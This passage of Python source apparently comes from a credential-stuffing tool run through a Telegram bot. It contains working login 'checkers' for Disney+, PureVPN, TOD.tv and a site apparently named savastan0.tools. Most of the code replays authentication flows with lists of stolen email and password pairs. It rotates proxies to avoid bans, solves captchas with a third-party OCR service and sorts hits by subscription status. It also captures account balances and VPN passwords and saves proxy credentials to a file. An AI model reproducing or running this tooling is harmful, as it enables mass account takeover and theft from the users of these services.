                    self.log_debug("Next renewal date not found")
                
                status_match = re.search(r'subscriberStatus[\\"]*[:\s]*[\\"]*([^\\",}]+)', response_text)
                if status_match:
                    subscriber_status = status_match.group(1)
                    self.log_debug(f"Subscriber status: {subscriber_status}")
                    if subscriber_status == "Active":
                        status = "PREMIUM"
                        self.log_debug("FINAL STATUS: PREMIUM ✅")
                    else:
                        status = "EXPIRED"
                        self.log_debug(f"FINAL STATUS: EXPIRED (Status: {subscriber_status})")
                else:
                    status = "PREMIUM"
                    self.log_debug("FINAL STATUS: PREMIUM (assumed from isSubscriber)")
            else:
                if 'account' in response_text:
                    status = "FREE"
                    self.log_debug("FINAL STATUS: FREE (Account exists, no subscription)")
                else:
                    status = "INVALID"
                    self.log_debug("FINAL STATUS: INVALID (No account found)")
            
            self.log_debug(f"{'='*60}\n")
            
            return {
                'status': status,
                'service': 'Disney+',
                'email': email,
                'password': password,
                'email_verified': email_verified,
                'country': country,
                'plan': plan,
                'free_trial': free_trial,
                'next_renewal': next_renewal,
                'is_subscriber': is_subscriber
            }
            
        except Exception as e:
            self.log_debug(f"UNEXPECTED ERROR: {str(e)}")
            if proxy_str and retry_count < 2:
                self.log_debug(f"Retrying with different proxy (attempt {retry_count + 1}/2)")
                self.mark_proxy_bad(proxy_str)
                return self.check(email, password, retry_count + 1)
            return {'status': 'ERROR', 'email': email, 'password': password, 'service': 'Disney+', 'message': str(e)}
        
        
import aiohttp
import asyncio
import base64
import re

async def check_savastan(username, password, proxy_url=None):
    """
    Returns a dictionary with the result of the check:
    {"status": "Success" | "Failure" | "Retry" | "Ban", "capture": {...}, "reason": "..."}
    """
    
    # Base headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Pragma": "no-cache"
    }

    # Using a CookieJar to automatically handle PHP session IDs
    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
        
        # ==========================================
        # 1. GET Login Page & Extract Captcha URL
        # ==========================================
        try:
            async with session.get("https://savastan0.tools/login", headers=headers, proxy=proxy_url, timeout=15) as resp:
                text = await resp.text()
        except Exception:
            return {"status": "Retry", "reason": "Connection Error on Login Page"}

        if '<img src="/captcha.php?' not in text:
            return {"status": "Ban", "reason": "Captcha element missing / IP Ban"}

        # Parse Captcha URL
        match = re.search(r'<img src="/(captcha\.php\?[^"]+)"', text)
        if not match:
            return {"status": "Retry", "reason": "Regex failed to extract captcha"}
        
        captcha_url = "https://savastan0.tools/" + match.group(1).replace("amp;", "")

        # ==========================================
        # 2. Download Captcha Image
        # ==========================================
        try:
            async with session.get(captcha_url, headers=headers, proxy=proxy_url, timeout=15) as resp:
                captcha_bytes = await resp.read()
                solver_b64 = base64.b64encode(captcha_bytes).decode('utf-8')
        except Exception:
            return {"status": "Retry", "reason": "Failed to download captcha image"}

        # ==========================================
        # 3. Solve Captcha via ImageText.io
        # ==========================================
        solver_headers = {
            "accept": "*/*",
            "content-type": "text/plain;charset=UTF-8",
            "origin": "https://imagetext.io",
            "referer": "https://imagetext.io/en",
            "user-agent": headers["User-Agent"]
        }
        solver_payload = f'{{"locale":"eng","imageBase64":"data:image/jpeg;base64,{solver_b64}"}}'
        
        try:
            async with session.post("https://imagetext.io/api/extract-text", headers=solver_headers, data=solver_payload, timeout=15) as resp:
                solver_resp = await resp.json()
                sv = solver_resp.get("ParsedText", "")
                
                if not sv:
                    return {"status": "Retry", "reason": "OCR returned empty text"}
        except Exception:
            return {"status": "Retry", "reason": "OCR API Error"}

        # ==========================================
        # 4. Submit Login Form
        # ==========================================
        login_headers = headers.copy()
        login_headers.update({
            "content-type": "application/x-www-form-urlencoded",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "origin": "https://savastan0.tools",
            "referer": "https://savastan0.tools/login"
        })
        
        payload = f"username={username}&password={password}&CAPTCHA={sv}&login=Login"
        
        try:
            async with session.post("https://savastan0.tools/login", headers=login_headers, data=payload, proxy=proxy_url, timeout=15) as resp:
                login_text = await resp.text()
        except Exception:
            return {"status": "Retry", "reason": "Login POST Error"}

        # ==========================================
        # 5. KeyChecks
        # ==========================================
        if "Password or username is incorrect" in login_text:
            return {"status": "Failure"}
            
        elif "warning CAPTCHA" in login_text:
            return {"status": "Retry", "reason": "Incorrect Captcha Solved"}
            
        elif "<script>location.href = 'index';</script>" in login_text:
            
            # ==========================================
            # 6. Capture Profile Data (Success)
            # ==========================================
            try:
                async with session.get("https://savastan0.tools/?profile", headers=headers, proxy=proxy_url, timeout=15) as resp:
                    profile_text = await resp.text()
                    
                    # Extract Data using Regex (Equivalent to LR Parsing)
                    reg_match = re.search(r'<strong>Registration times</strong><br>\s*<p class="text-muted">([^<]+)', profile_text)
                    balance_match = re.search(r'Balance: <strong>([^<]+)</strong></div>', profile_text)
                    tp_match = re.search(r'<strong>Total Purchased</strong><br>\s*<p class="text-muted">([^<]+)', profile_text)
                    
                    capture_data = {
                        "Registered": reg_match.group(1).strip() if reg_match else "N/A",
                        "Balance": balance_match.group(1).strip() if balance_match else "N/A",
                        "TotalPurchased": tp_match.group(1).strip() if tp_match else "N/A",
                        "Config By": "@xtg_xl"
                    }

                    return {
                        "status": "Success",
                        "capture": capture_data
                    }
            except Exception:
                # If profile fetch fails, it's still a hit
                return {"status": "Success", "capture": {"Warning": "Hit, but failed to scrape profile", "Config By": "@xtg_xl"}}
        
        else:
            return {"status": "Retry", "reason": "Unknown response on login check"}
        
        
# ============ PUREVPN CHECKER ============
class PureVPNChecker:
    def __init__(self, proxies=None, debug=False):
        self.proxies = proxies if proxies else []
        self.bad_proxies = set()
        self.debug = debug
        self.session = requests.Session()
        
    def log_debug(self, message, data=None):
        if self.debug:
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"{Colors.CYAN}[DEBUG {timestamp}]{Colors.RESET} {message}")
            if data:
                print(f"{Colors.GRAY}{str(data)[:500]}{Colors.RESET}")
    
    def _get_random_proxy(self):
        if not self.proxies:
            return None, None
        available_proxies = [p for p in self.proxies if p not in self.bad_proxies]
        if not available_proxies:
            self.bad_proxies.clear()
            available_proxies = self.proxies
        proxy = random.choice(available_proxies)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}, proxy
    
    def mark_proxy_bad(self, proxy_str):
        if proxy_str:
            self.bad_proxies.add(proxy_str)
    
    def generate_code_verifier(self):
        """Generate a random code verifier for PKCE"""
        import secrets
        import hashlib
        import base64
        
        # Generate random string
        code_verifier = secrets.token_urlsafe(32)
        
        # Generate code challenge
        code_challenge = hashlib.sha256(code_verifier.encode()).digest()
        code_challenge = base64.urlsafe_b64encode(code_challenge).decode().replace('=', '')
        
        return code_verifier, code_challenge
    
    def check(self, username, password, retry_count=0):
        self.log_debug(f"\n{'='*60}")
        self.log_debug(f"Checking PureVPN account: {username}")
        
        proxy_dict, proxy_str = self._get_random_proxy() if self.proxies else (None, None)
        if proxy_dict:
            self.session.proxies.update(proxy_dict)
        
        try:
            # Generate PKCE codes
            code_verifier, code_challenge = self.generate_code_verifier()
            
            # Step 1: Get authorization code
            self.log_debug("STEP 1: Getting authorization code")
            
            url1 = "https://auth.purevpn.com/oauth2/authorize"
            
            headers1 = {
                'Host': 'purevpn.fusionauth.io',
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Brave";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://purevpn.fusionauth.io',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Sec-GPC': '1',
                'Accept-Language': 'en-US,en;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://purevpn.fusionauth.io/',
                'Accept-Encoding': 'gzip, deflate'
            }
            
            data1 = {
                'captcha_token': '',
                'client_id': 'a0724cd0-88bc-4326-a0ec-a2c210dfd908',
                'code_challenge': code_challenge,
                'code_challenge_method': 'S256',
                'metaData.device.name': 'Windows Chrome',
                'metaData.device.type': 'BROWSER',
                'nonce': '',
                'pendingIdPLinkId': '',
                'redirect_uri': 'https://bfidboloedlamgdmenmlbipfnccokknp.chromiumapp.org/oauth2',
                'response_mode': '',
                'response_type': 'code',
                'scope': 'offline_access',
                'state': '',
                'tenantId': '9707f41e-21a4-bbc5-dcbc-fdf6b61cc68f',
                'timezone': 'Asia/Dubai',
                'user_code': '',
                'showPasswordField': 'true',
                'loginId': username,
                'password': password
            }
            
            response1 = self.session.post(url1, headers=headers1, data=data1, timeout=30, allow_redirects=False)
            
            self.log_debug(f"Authorization response status: {response1.status_code}")
            
            # Check for invalid credentials
            if 'Invalid login credentials' in response1.text:
                return {'status': 'INVALID', 'email': username, 'message': 'Invalid credentials'}
            
            # Check for rate limiting
            if response1.status_code == 429:
                return {'status': 'ERROR', 'email': username, 'message': 'Rate limited, try again later'}
            
            # Check if we have a redirect with code
            if 'location' in response1.headers:
                location = response1.headers['location']
                self.log_debug(f"Redirect location: {location[:200]}")
                
                # Extract code from redirect URL
                if 'code=' in location:
                    code_start = location.find('code=') + 5
                    code_end = location.find('&', code_start)
                    if code_end == -1:
                        code_end = len(location)
                    code = location[code_start:code_end]
                    self.log_debug(f"Extracted code: {code[:50]}...")
                else:
                    return {'status': 'ERROR', 'email': username, 'message': 'No code in redirect'}
            else:
                return {'status': 'ERROR', 'email': username, 'message': 'No redirect location'}
            
            # Step 2: Exchange code for access token
            self.log_debug("STEP 2: Exchanging code for access token")
            
            url2 = "https://auth.purevpn.com/oauth2/token"
            
            headers2 = {
                'Host': 'purevpn.fusionauth.io',
                'Connection': 'keep-alive',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Sec-GPC': '1',
                'Origin': 'chrome-extension://bfidboloedlamgdmenmlbipfnccokknp',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate'
            }
            
            data2 = {
                'code': code,
                'grant_type': 'authorization_code',
                'redirect_uri': 'https://bfidboloedlamgdmenmlbipfnccokknp.chromiumapp.org/oauth2',
                'client_id': 'a0724cd0-88bc-4326-a0ec-a2c210dfd908',
                'code_verifier': code_verifier
            }
            
            response2 = self.session.post(url2, headers=headers2, data=data2, timeout=30)
            
            self.log_debug(f"Token response status: {response2.status_code}")
            
            try:
                token_data = response2.json()
                access_token = token_data.get('access_token')
                
                if not access_token:
                    self.log_debug(f"Failed to get access token. Response: {response2.text[:200]}")
                    return {'status': 'ERROR', 'email': username, 'message': 'Failed to get access token'}
                
                self.log_debug(f"Access token obtained: {access_token[:30]}...")
                
            except Exception as e:
                self.log_debug(f"Failed to parse token response: {str(e)}")
                return {'status': 'ERROR', 'email': username, 'message': 'Failed to parse token response'}
            
            # Step 3: Get user info
            self.log_debug("STEP 3: Getting user info")
            
            url3 = "https://auth.purevpn.com/oauth2/userinfo"
            
            headers3 = {
                'Host': 'purevpn.fusionauth.io',
                'Connection': 'keep-alive',
                'Authorization': f'Bearer {access_token}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Sec-GPC': '1',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate'
            }
            
            response3 = self.session.get(url3, headers=headers3, timeout=30)
            
            self.log_debug(f"User info response status: {response3.status_code}")
            
            try:
                user_data = response3.json()
                self.log_debug(f"User data keys: {list(user_data.keys())}")
                
                # Extract plan and expiry
                plan = user_data.get('plan', 'Free')
                expiry = user_data.get('expiry', 'N/A')
                vpn_username = user_data.get('vpnusername', user_data.get('vpn_username', ''))
                
                # Calculate remaining days
                remaining_days = "N/A"
                if expiry and expiry != 'N/A':
                    try:
                        from datetime import datetime
                        expiry_date = datetime.strptime(expiry, '%Y-%m-%d')
                        days_left = (expiry_date - datetime.now()).days
                        remaining_days = f"{days_left} days"
                    except:
                        pass
                
                self.log_debug(f"Plan: {plan}")
                self.log_debug(f"Expiry: {expiry}")
                self.log_debug(f"VPN Username: {vpn_username}")
                self.log_debug(f"Remaining days: {remaining_days}")
                
                # Check if account is free or expired
                if not vpn_username or vpn_username == 'null':
                    return {'status': 'FREE', 'email': username, 'password': password, 'plan': 'Free', 'message': 'Free account'}
                
                if remaining_days != "N/A" and "days" in str(remaining_days):
                    days_num = int(str(remaining_days).split()[0])
                    if days_num <= 1:
                        return {'status': 'EXPIRED', 'email': username, 'password': password, 'plan': plan, 'expiry': expiry}
                
                # Step 4: Get VPN password
                self.log_debug("STEP 4: Getting VPN password")
                
                url4 = "https://api.proxy.purevpn.com/v3/auth/vpnpassword"
                
                headers4 = {
                    'Host': 'api.proxy.purevpn.com',
                    'Connection': 'keep-alive',
                    'X-Auth-Token': access_token,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'Sec-GPC': '1',
                    'Origin': 'chrome-extension://bfidboloedlamgdmenmlbipfnccokknp',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate'
                }
                
                data4 = {
                    'user_name': vpn_username
                }
                
                response4 = self.session.post(url4, headers=headers4, data=data4, timeout=30)
                
                self.log_debug(f"VPN password response status: {response4.status_code}")
                
                if response4.status_code == 403:
                    return {'status': 'ERROR', 'email': username, 'message': 'Access forbidden'}
                
                try:
                    vpn_data = response4.json()
                    vpn_password = vpn_data.get('password', '')
                    
                    if not vpn_password:
                        return {'status': 'ERROR', 'email': username, 'message': 'Failed to get VPN password'}
                    
                    self.log_debug(f"VPN Password obtained: {vpn_password[:10]}...")
                    
                except Exception as e:
                    self.log_debug(f"Failed to parse VPN password response: {str(e)}")
                    return {'status': 'ERROR', 'email': username, 'message': 'Failed to get VPN password'}
                
                # Generate proxy list
                proxy_servers = [
                  
                ]
                
                # Save proxies to file
                with open('PureVPN Proxy.txt', 'a', encoding='utf-8') as f:
                    for server in proxy_servers:
                        f.write(f"{server}:{vpn_username}:{vpn_password}\n")
                
                return {
                    'status': 'PREMIUM',
                    'service': 'PureVPN',
                    'email': username,
                    'password': password,
                    'plan': plan,
                    'expiry': expiry,
                    'remaining_days': remaining_days,
                    'vpn_username': vpn_username,
                    'vpn_password': vpn_password,
                    'proxy_count': len(proxy_servers)
                }
                
            except Exception as e:
                self.log_debug(f"Failed to parse user info: {str(e)}")
                return {'status': 'ERROR', 'email': username, 'message': str(e)}
            
        except Exception as e:
            self.log_debug(f"ERROR in check method: {str(e)}")
            if proxy_str and retry_count < 2:
                self.log_debug(f"Retrying with different proxy (attempt {retry_count + 1}/2)")
                self.mark_proxy_bad(proxy_str)
                self.session = requests.Session()
                return self.check(username, password, retry_count + 1)
            return {'status': 'ERROR', 'email': username, 'message': str(e)}

# ============ TOD.TV CHECKER ============
class TodTvChecker:
    def __init__(self, proxies=None, debug=False):
        self.proxies = proxies if proxies else []
        self.bad_proxies = set()
        self.debug = debug
        self.session = requests.Session()
        
    def log_debug(self, message, data=None):
        if self.debug:
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"{Colors.CYAN}[DEBUG {timestamp}]{Colors.RESET} {message}")
            if data:
                print(f"{Colors.GRAY}{str(data)[:500]}{Colors.RESET}")
    
    def _get_random_proxy(self):
        if not self.proxies:
            return None, None
        available_proxies = [p for p in self.proxies if p not in self.bad_proxies]
        if not available_proxies:
            self.log_debug("No good proxies left, resetting bad proxies list")
            self.bad_proxies.clear()
            available_proxies = self.proxies
        proxy = random.choice(available_proxies)
        self.log_debug(f"Selected proxy: {proxy[:50]}...")
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}, proxy
    
    def mark_proxy_bad(self, proxy_str):
        if proxy_str:
            self.bad_proxies.add(proxy_str)
            self.log_debug(f"Marked proxy as bad: {proxy_str[:50]}...")
    
    def check(self, username, password, retry_count=0):
        self.log_debug(f"\n{'='*60}")
        self.log_debug(f"Checking TOD.tv account: {username}")
        
        # Create a new session for each check to avoid state issues
        self.session = requests.Session()
        
        proxy_dict, proxy_str = self._get_random_proxy() if self.proxies else (None, None)
        if proxy_dict:
            self.session.proxies.update(proxy_dict)
        
        try:
            # Step 1: GET initial page to get CSRF and state
            self.log_debug("STEP 1: Getting initial page")
            
            url1 = "https://my2.tod.tv/d8afef6e-b6f7-42c8-8de0-b32127672088/oauth2/v2.0/authorize"
            
            params1 = {
                'p': 'B2C_1A_SIGNUP_SIGNIN_EMAIL',
                'client_id': '1c1e4761-b9d4-4cfa-a4e4-5063e6d501a7',
                'redirect_uri': 'https://www.tod.tv/auth/sign-in',
                'scope': 'openid profile offline_access',
                'response_type': 'code id_token',
                'response_mode': 'query',
                'nonce': '638447.YjIzZjZji',
                'ui_locales': 'en',
                'DeviceType': 'phone',
                'Manufacturer': 'Unknown',
                'OsVersion': 'Android',
                'Model': 'Android Phone',
                'DeviceId': str(uuid.uuid4()),
                'deviceName': 'Unknown-phone',
                'osType': 'phone',
                'state': 'eyJsb2NhbGUiOiJlbiIsImFwcFJlZGlyZWN0VXJpIjoiL2VuIn0=',
                'prompt': 'login'
            }
            
            headers1 = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            }
            
            response1 = self.session.get(url1, params=params1, headers=headers1, timeout=15, allow_redirects=True)
            text1 = response1.text
            
            # Extract CSRF token from cookies
            csrf = response1.cookies.get('x-ms-cpim-csrf')
            if not csrf:
                # Try to extract from page
                csrf_match = re.search(r'csrf":\s*"([^"]+)"', text1)
                csrf = csrf_match.group(1) if csrf_match else None
            
            # Extract transaction ID (StateProperties)
            tx_match = re.search(r'"transId":"([^"]+)"', text1)
            if not tx_match:
                tx_match = re.search(r'stateProperties=([^&"\']+)', text1)
            
            tx_value = tx_match.group(1) if tx_match else None
            
            # Extract pageViewId
            page_match = re.search(r'"pageViewId":"([^"]+)"', text1)
            pageViewId = page_match.group(1) if page_match else str(uuid.uuid4())
            
            self.log_debug(f"CSRF: {csrf[:50] if csrf else 'None'}...")
            self.log_debug(f"Transaction ID: {tx_value[:50] if tx_value else 'None'}...")
            self.log_debug(f"PageViewId: {pageViewId}")
            
            if not csrf or not tx_value:
                self.log_debug("Failed to get CSRF or transaction ID")
                return {'status': 'ERROR', 'username': username, 'password': password, 'service': 'TOD.tv', 'message': 'Failed to initialize authentication'}
            
            # Step 2: Send login credentials
            self.log_debug("STEP 2: Sending login credentials")
            
            url2 = f"https://my2.tod.tv/d8afef6e-b6f7-42c8-8de0-b32127672088/B2C_1A_Signup_Signin_Email/SelfAsserted"
            
            params2 = {
                'tx': f'StateProperties={tx_value}',
                'p': 'B2C_1A_Signup_Signin_Email'
            }
            
            headers2 = {
                'Host': 'my2.tod.tv',
                'x-csrf-token': csrf,
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://my2.tod.tv',
                'Referer': response1.url,
                'Accept-Language': 'en-US,en;q=0.9',
            }
            
            data2 = f'request_type=RESPONSE&signInName={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}'
            
            response2 = self.session.post(url2, params=params2, headers=headers2, data=data2, timeout=15)
            
            self.log_debug(f"Login response status: {response2.status_code}")
            
            if response2.status_code != 200:
                if response2.status_code == 400:
                    return {'status': 'INVALID', 'username': username, 'password': password, 'service': 'TOD.tv', 'message': 'Invalid credentials'}
                return {'status': 'ERROR', 'username': username, 'password': password, 'service': 'TOD.tv', 'message': f'Login failed with status {response2.status_code}'}
            
            # Check response for errors
            try:
                response2_json = response2.json()
                if response2_json.get('status') == '400':
                    return {'status': 'INVALID', 'username': username, 'password': password, 'service': 'TOD.tv', 'message': 'Invalid credentials'}
            except:
                pass
            
            # Step 3: Get the redirect with tokens
            self.log_debug("STEP 3: Getting authorization redirect")
            
            url3 = f"https://my2.tod.tv/d8afef6e-b6f7-42c8-8de0-b32127672088/B2C_1A_Signup_Signin_Email/api/CombinedSigninAndSignup/confirmed"
            
            params3 = {
                'rememberMe': 'false',
                'csrf_token': csrf,
                'tx': f'StateProperties={tx_value}',
                'p': 'B2C_1A_Signup_Signin_Email',
                'diags': f'{{"pageViewId":"{pageViewId}"}}'
            }
            
            headers3 = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            }
            
            # Don't follow redirects automatically, we want to capture the location header
            response3 = self.session.get(url3, params=params3, headers=headers3, timeout=15, allow_redirects=False)
            
            self.log_debug(f"Confirmation response status: {response3.status_code}")
            
            # Get the redirect location
            location = response3.headers.get('Location', '')
            if not location and response3.status_code == 302:
                location = response3.headers.get('location', '')
            
            self.log_debug(f"Redirect location: {location[:100] if location else 'None'}...")
            
            # Follow the redirect to get the final URL with tokens
            if location:
                response4 = self.session.get(location, timeout=30, allow_redirects=True)
                final_url = response4.url
            else:
                final_url = response3.url
            
            self.log_debug(f"Final URL: {final_url[:200] if final_url else 'None'}...")
            
            # Extract tokens from final URL
            id_token = None
            code = None
            
            # Parse the URL parameters
            parsed_url = urllib.parse.urlparse(final_url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            if 'id_token' in params:
                id_token = params['id_token'][0]
            if 'code' in params:
                code = params['code'][0]
            
            # Also check fragment
            if parsed_url.fragment:
                fragment_params = urllib.parse.parse_qs(parsed_url.fragment)
                if 'id_token' in fragment_params:
                    id_token = fragment_params['id_token'][0]
                if 'code' in fragment_params:
                    code = fragment_params['code'][0]
            
            if not id_token or not code:
                self.log_debug(f"Failed to extract tokens from URL. id_token: {bool(id_token)}, code: {bool(code)}")
                return {'status': 'ERROR', 'username': username, 'password': password, 'service': 'TOD.tv', 'message': 'Failed to get authorization tokens'}
            
            self.log_debug("Successfully obtained id_token and code")
            
            # Step 4: Exchange for access token
            self.log_debug("STEP 4: Exchanging for access token")
            
            url4 = "https://www.tod.tv/api/service"
            
            login_payload = {
                "authorizationCode": code,
                "idToken": id_token,
                "redirectUri": "https://www.tod.tv"
            }
            
            request_payload = {
                "requestInit": {
                    "method": "POST",
                    "body": json.dumps(login_payload),
                    "headers": {
                        "Content-Type": "application/json"
                    }
                },
                "skipAPIKeyControl": False,
                "url": "http://tod2-mw-user-prod.mw-user.svc.cluster.local/api/v1/auth/login"
            }
            
            headers4 = {
                'Host': 'www.tod.tv',
                'Accept': '*/*',
                'Origin': 'https://www.tod.tv',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Referer': 'https://www.tod.tv/'
            }
            
            response5 = self.session.post(url4, headers=headers4, json=request_payload, timeout=15)
            
            self.log_debug(f"Token exchange response status: {response5.status_code}")
            
            # Parse the response correctly
            access_token = None
            try:
                response_data = response5.json()
                self.log_debug(f"Token response keys: {list(response_data.keys())}")
                
                # The response has a 'data' field containing the token
                if 'data' in response_data:
                    data_field = response_data['data']
                    if isinstance(data_field, dict):
                        access_token = data_field.get('at') or data_field.get('accessToken')
                    elif isinstance(data_field, str):
                        # Sometimes data is a string that contains JSON
                        try:
                            data_json = json.loads(data_field)
                            access_token = data_json.get('at') or data_json.get('accessToken')
                        except:
                            pass
                else:
                    # Direct access
                    access_token = response_data.get('at') or response_data.get('accessToken')
                
                if not access_token:
                    # Try to extract with regex
                    at_match = re.search(r'"at":"([^"]+)"', response5.text)
                    if at_match:
                        access_token = at_match.group(1)
                
                if not access_token:
                    self.log_debug(f"Failed to get access token. Response: {response5.text[:300]}")
                    return {'status': 'ERROR', 'username': username, 'password': password, 'service': 'TOD.tv', 'message': 'Failed to get access token'}
                
                self.log_debug(f"Access token obtained successfully: {access_token[:30]}...")
                
            except Exception as e:
                self.log_debug(f"Failed to parse token response: {str(e)}")
                return {'status': 'ERROR', 'username': username, 'password': password, 'service': 'TOD.tv', 'message': 'Failed to parse token response'}
            
            # Step 5: Get subscription info
            self.log_debug("STEP 5: Getting subscription information")
            
            subscription_payload = {
                "requestInit": {
                    "method": "GET",
                    "headers": {
                        "Authorization": f"Bearer {access_token}"
                    }
                },
                "skipAPIKeyControl": False,
                "url": "http://tod2-mw-order-prod.mw-order.svc.cluster.local/api/v1/subscriptions"
            }
            
            response6 = self.session.post(url4, headers=headers4, json=subscription_payload, timeout=15)
            
            self.log_debug(f"Subscription response status: {response6.status_code}")
            
            # Parse subscription info
            plan = "Free"
            status = "FREE"
            billing_cycle = "N/A"
            expiry_date = "N/A"
            
            try:
                # Check if we got a valid response
                if response6.status_code == 200:
                    sub_data = response6.json()
                    self.log_debug(f"Subscription data type: {type(sub_data)}")
                    
                    # Handle different response formats
                    if isinstance(sub_data, dict):
                        # Check if there's a data field
                        if 'data' in sub_data:
                            sub_data = sub_data['data']
                        
                        # Check for subscriptions list
                        if 'subscriptions' in sub_data:
                            subscriptions = sub_data['subscriptions']
                        elif 'items' in sub_data:
                            subscriptions = sub_data['items']
                        else:
                            subscriptions = [sub_data] if sub_data.get('id') else []
                        
                        if subscriptions and len(subscriptions) > 0:
                            status = "PREMIUM"
                            subscription = subscriptions[0]
                            
                            plan = subscription.get('description') or subscription.get('name') or subscription.get('productName') or 'Premium'
                            billing_cycle = subscription.get('cycle') or subscription.get('billingCycle') or 'N/A'
                            expiry_date = subscription.get('expiryDate') or subscription.get('endDate') or subscription.get('validUntil') or 'N/A'
                            
                            if expiry_date and expiry_date != 'N/A' and 'T' in expiry_date:
                                expiry_date = expiry_date.split('T')[0]
                    
                    elif isinstance(sub_data, list) and len(sub_data) > 0:
                        status = "PREMIUM"
                        subscription = sub_data[0]
                        plan = subscription.get('description') or subscription.get('name') or 'Premium'
                        billing_cycle = subscription.get('cycle', 'N/A')
                        expiry_date = subscription.get('expiryDate', 'N/A')
                        
                elif response6.status_code == 401:
                    # Token might be expired but account could still be valid
                    self.log_debug("Subscription endpoint returned 401, but account might still be valid")
                    status = "PREMIUM"
                    plan = "Premium (Token Issue)"
                else:
                    self.log_debug(f"Subscription endpoint returned {response6.status_code}")
                    
            except Exception as e:
                self.log_debug(f"Error parsing subscription data: {str(e)}")
                # If we have a valid response but can't parse, still consider it a hit
                if response6.status_code == 200:
                    status = "PREMIUM"
                    plan = "Premium Account"
            
            self.log_debug(f"Final status: {status}, Plan: {plan}")
            
            # Return consistent result format
            return {
                'status': status,
                'service': 'TOD.tv',
                'username': username,
                'email': username,
                'password': password,
                'plan': plan,
                'billing_cycle': billing_cycle,
                'expiry_date': expiry_date
            }
            
        except requests.exceptions.ReadTimeout:
            self.log_debug(f"Read timeout occurred")
            if proxy_str and retry_count < 2:
                self.log_debug(f"Retrying with different proxy (attempt {retry_count + 1}/2)")
                self.mark_proxy_bad(proxy_str)
                return self.check(username, password, retry_count + 1)
            return {'status': 'ERROR', 'username': username, 'password': password, 'service': 'TOD.tv', 'message': 'Connection timeout'}
        except Exception as e:
            self.log_debug(f"ERROR in check method: {str(e)}")
            import traceback
            self.log_debug(f"Traceback: {traceback.format_exc()}")
            if proxy_str and retry_count < 2:
                self.log_debug(f"Retrying with different proxy (attempt {retry_count + 1}/2)")
                self.mark_proxy_bad(proxy_str)
                return self.check(username, password, retry_count + 1)
            return {'status': 'ERROR', 'username': username, 'password': password, 'service': 'TOD.tv', 'message': str(e)}

# ============ TELEGRAM BOT WITH MULTI-USER SUPPORT ============
class StreamingBot:
    def __init__(self, bot_token, admin_ids=None):
        self.bot = telebot.TeleBot(bot_token)
        self.admin_ids = admin_ids or []
        self.crunchyroll_checker = None
        self.disney_checker = None
        self.tod_checker = None
        self.proxies = []
        self.active_service = "crunchyroll"
        self.active_checks = {}
        self.mass_check_active = {}
        self.user_checking = {}
        
        self.setup_handlers()
    
    def get_main_keyboard(self, user_id):
        # Legacy telebot keyboard for reply_markup fallback
